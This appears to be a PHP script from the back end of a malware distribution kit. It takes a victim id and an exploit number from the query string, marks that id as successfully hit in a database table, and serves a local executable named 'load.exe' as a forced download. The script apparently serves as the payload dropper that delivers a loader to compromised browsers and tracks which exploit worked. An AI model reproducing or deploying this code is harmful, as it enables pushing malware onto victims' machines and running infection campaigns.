<?php

	error_reporting(0);

	@include( "config.php" );

	if (!($id = intval($_GET['id']))) die;
	$opr = intval($_GET['opr']);
	$spl = intval($_GET['spl']);

	@$conid = mysql_connect( $SQLHOST, $SQLLOGIN, $SQLPWD );
	@mysql_select_db( $SQLDB, $conid );

	$filename = "load.exe";

	if ( ( $size = filesize($filename) ) )
		if ( ( $fp = fopen($filename, "r") ) )
			if ( ( $source = fread($fp, $size) ) )
			{
				if(empty($opr))mysql_query( "UPDATE ".$TABLENAME." SET ok = '1',sp = '".$spl."' WHERE id = '".$id."'", $conid );

				header("Accept-Ranges: bytes\r\n");
				header("Content-Length: ".$size."\r\n");
				header("Content-Disposition: inline; filename=".$filename);
				header("\r\n");
				header("Content-Type: application/octet-stream\r\n\r\n");
				die($source);
			}
			fclose($fp);
?>
